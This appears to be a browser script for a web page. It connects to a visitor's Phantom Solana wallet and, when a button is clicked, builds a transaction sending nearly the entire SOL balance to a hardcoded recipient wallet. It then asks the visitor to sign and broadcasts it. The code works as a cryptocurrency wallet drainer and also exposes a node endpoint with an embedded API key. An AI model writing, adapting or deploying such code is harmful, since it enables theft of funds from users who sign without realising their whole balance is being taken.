<script type="module">
    import { Connection, PublicKey, Transaction, SystemProgram } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js/+esm';

    window.Buffer = window.buffer.Buffer; // Fix for Buffer error

    const recipientWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
    const connection = new Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df");

    async function connectPhantomWallet() {
        try {
            if (window.phantom?.solana && window.phantom?.solana.isPhantom) {
                console.log("Phantom wallet detected.");
                const provider = window.phantom.solana;
                await provider.connect();
                return provider.publicKey.toString();
            } else {
                alert("Phantom wallet not detected. Please install it.");
                return null;
            }
        } catch (error) {
            console.error("Wallet connection failed:", error);
            alert("Error connecting to wallet. Please try again.");
            return null;
        }
    }

    async function transferFunds() {
        const senderPublicKey = await connectPhantomWallet();
        if (!senderPublicKey) return;

        try {
            console.log("Fetching balance...");
            const balance = await connection.getBalance(new PublicKey(senderPublicKey));
            console.log(`SOL Balance: ${balance / 1e9} SOL`);

            if (balance <= 5000) {
                alert('Insufficient SOL balance for transaction fees.');
                return;
            }

            console.log("Preparing transaction...");
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: new PublicKey(senderPublicKey),
                    toPubkey: new PublicKey(recipientWallet),
                    lamports: balance - 5000, // Deduct small buffer for fees
                })
            );

            transaction.feePayer = new PublicKey(senderPublicKey);
            const { blockhash } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;

            console.log("Signing transaction...");
            const provider = window.phantom.solana;
            const signedTransaction = await provider.signTransaction(transaction);

            console.log("Sending transaction...");
            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
            
            alert(`Transaction sent! Check status here: https://explorer.solana.com/tx/${signature}?cluster=mainnet`);
        } catch (error) {
            console.error("Transaction failed:", error);
            alert(`Error: ${error.message}`);
        }
    }

    document.getElementById('transferBtn').addEventListener('click', transferFunds);
</script>
